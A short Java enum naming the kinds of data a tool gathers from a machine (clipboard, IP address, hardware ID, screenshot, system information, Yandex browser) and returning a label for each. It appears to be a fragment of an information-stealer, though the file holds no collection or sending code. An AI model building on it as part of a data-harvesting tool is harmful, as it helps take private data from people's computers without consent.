package maven.example.com.tools.data;

import java.util.Random;

public enum TypeData {
    SYSTEM_CLIPBOARD,
    SYSTEM_IP,
    SYSTEM_HWID,
    SYSTEM_SCREEN,
    SYSTEM_INFORMATION_JAVA,
    BROWSER_YANDEX;

    public String getStringType() {
        String str;
        switch (this) {
            case SYSTEM_CLIPBOARD:
                str = "Clipboard";
                break;
            case SYSTEM_SCREEN:
                str = "Screenshot";
                break;
            case SYSTEM_IP:
                str = "IP";
                break;
            case SYSTEM_HWID:
                str = "HWID";
                break;
            case SYSTEM_INFORMATION_JAVA:
                str = "SystemInformation";
                break;
            default:
                str = "Unknown data type_" + new Random().nextLong();
        }

        return str;
    }
}
